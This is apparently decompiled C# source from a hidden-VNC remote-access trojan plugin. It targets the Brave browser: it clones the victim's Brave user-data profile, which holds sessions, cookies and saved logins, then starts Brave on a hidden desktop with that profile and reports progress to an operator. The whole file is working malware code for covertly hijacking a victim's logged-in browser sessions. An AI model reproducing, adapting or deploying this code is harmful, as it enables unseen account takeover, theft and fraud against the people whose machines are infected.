using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using DLL.S.OpenApp;
using HVNC;
using Microsoft.VisualBasic.Devices;

namespace S.OpenApp
{
	// Token: 0x02000009 RID: 9
	internal class Brave
	{
		// Token: 0x0600004A RID: 74 RVA: 0x000034D8 File Offset: 0x000016D8
		public static void OpenBraveBrowser()
		{
			HideDesktop.Load(Plugin.Helper.HVNCDesktop);
			try
			{
				bool flag = !File.Exists(Brave.FilenameBrave) && !File.Exists(Brave.FilenameBravex86);
				bool flag2 = flag;
				if (flag2)
				{
					Plugin.Helper.SendMSG("Brave: Not Installed!");
				}
				else
				{
					try
					{
						bool flag3 = !Directory.Exists(Brave.fileNameUserDataCopy);
						bool flag4 = flag3;
						if (flag4)
						{
							Plugin.Helper.SendMSG("Brave: CloneProfile..");
							Brave.PC.FileSystem.CopyDirectory(Brave.fileNameUserData, Brave.fileNameUserDataCopy);
							Plugin.Helper.SendMSG("Brave: CloneProfile Completed");
						}
					}
					catch
					{
						Debug.WriteLine("Error!");
					}
					Debug.WriteLine("Complete.///");
					new Thread(delegate()
					{
						Thread.Sleep(1000);
						HideDesktop.Load(Plugin.Helper.HVNCDesktop);
						Brave.Open();
					}).Start();
				}
			}
			catch (Exception ex)
			{
				Plugin.Helper.SendMSG("Brave: " + ex.Message);
			}
		}

		// Token: 0x0600004B RID: 75 RVA: 0x000035F4 File Offset: 0x000017F4
		public static void Open()
		{
			try
			{
				string text = null;
				bool flag = File.Exists(Brave.FilenameBrave);
				if (flag)
				{
					text = Brave.FilenameBrave;
				}
				bool flag2 = File.Exists(Brave.FilenameBravex86);
				if (flag2)
				{
					text = Brave.FilenameBravex86;
				}
				bool flag3 = text == null;
				if (!flag3)
				{
					HideDesktop.CreateProcess(string.Concat(new string[]
					{
						"\"",
						text,
						"\" --disable-3d-apis --disable-gpu --disable-d3d11 \"--user-data-dir=",
						Brave.fileNameUserDataCopy,
						"\""
					}), Plugin.Helper.NameDesktop, false);
					Debug.WriteLine("Running.////");
					Plugin.Helper.SendMSG("Brave: Running");
					Thread.Sleep(3000);
					HideDesktop.Load(Plugin.Helper.HVNCDesktop);
					Debug.WriteLine("Refresh");
				}
			}
			catch (Exception ex)
			{
				Plugin.Helper.SendMSG("Brave: " + ex.Message);
			}
		}

		// Token: 0x0400001A RID: 26
		private static readonly Computer PC = new Computer();

		// Token: 0x0400001B RID: 27
		private static readonly string fileNameUserData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\User Data";

		// Token: 0x0400001C RID: 28
		private static readonly string fileNameUserDataCopy = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\BraveSoftware\\Brave-Browser\\Brave Data";

		// Token: 0x0400001D RID: 29
		private static readonly string FilenameBrave = WDir.SystemDirectory + "Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";

		// Token: 0x0400001E RID: 30
		private static readonly string FilenameBravex86 = WDir.SystemDirectory + "Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe";
	}
}
